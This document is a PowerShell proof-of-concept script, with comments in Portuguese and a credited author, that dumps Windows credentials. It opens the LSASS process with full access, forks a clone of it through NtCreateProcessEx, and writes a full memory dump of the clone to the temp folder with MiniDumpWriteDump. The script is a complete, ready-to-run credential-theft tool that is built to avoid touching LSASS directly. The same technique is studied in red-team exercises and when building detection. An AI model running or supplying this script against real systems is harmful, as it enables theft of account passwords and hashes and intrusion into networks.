# ================================================
#     LSASS Forked Dump - PoC V 1.0
#     Autor: Willian Oliveira
#     Empresa: Escola hack3r 
# ================================================

Write-Host "===============================================" -ForegroundColor Cyan
Write-Host "           LSASS Forked Dump - PoC - V 1.0     " -ForegroundColor Cyan
Write-Host "           Autor: Willian Oliveira             " -ForegroundColor Cyan
Write-Host "           Empresa: Escola hack3r              " -ForegroundColor Cyan
Write-Host "===============================================" -ForegroundColor Cyan
Write-Host ""

# Definição da classe com P/Invoke
Write-Host "[*] Carregando definições de API..." -ForegroundColor Yellow

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class LSASSForkDump {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtCreateProcessEx(
        out IntPtr processHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr parentProcess,
        bool inheritObjectTable,
        IntPtr sectionHandle,
        IntPtr debugPort,
        IntPtr exceptionPort,
        bool inJob
    );

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );
}
"@

Write-Host "[+] API carregada com sucesso." -ForegroundColor Green
Write-Host ""

# Abrir o processo LSASS
Write-Host "[*] Tentando abrir o processo LSASS..." -ForegroundColor Yellow
$lsass = Get-Process lsass
$lsassHandle = [LSASSForkDump]::OpenProcess(0x001F0FFF, $false, $lsass.Id) # PROCESS_ALL_ACCESS

if ($lsassHandle -eq [IntPtr]::Zero) {
    Write-Host "[!] Falha ao abrir o processo LSASS!" -ForegroundColor Red
    return
} else {
    Write-Host "[+] Processo LSASS aberto com sucesso." -ForegroundColor Green
}

Write-Host ""

# Clonar o processo LSASS
Write-Host "[*] Tentando clonar o processo LSASS..." -ForegroundColor Yellow
[IntPtr]$forkedHandle = [IntPtr]::Zero
$ntstatus = [LSASSForkDump]::NtCreateProcessEx([ref]$forkedHandle, 0x001F0FFF, [IntPtr]::Zero, $lsassHandle, $true, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false)

if ($forkedHandle -eq [IntPtr]::Zero) {
    Write-Host "[!] Falha ao clonar o processo LSASS!" -ForegroundColor Red
    return
} else {
    Write-Host "[+] Processo LSASS clonado com sucesso." -ForegroundColor Green
}

Write-Host ""

# Dumpar o clone
Write-Host "[*] Criando o dump do processo clonado..." -ForegroundColor Yellow
$dumpPath = "$env:TEMP\forked_lsass.dmp"
$fs = New-Object IO.FileStream($dumpPath, [IO.FileMode]::Create, [IO.FileAccess]::Write)
$success = [LSASSForkDump]::MiniDumpWriteDump($forkedHandle, 0, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$fs.Close()

if ($success) {
    Write-Host "[+] Dump criado com sucesso em: $dumpPath" -ForegroundColor Green
} else {
    Write-Host "[!] Falha ao criar o dump!" -ForegroundColor Red
}
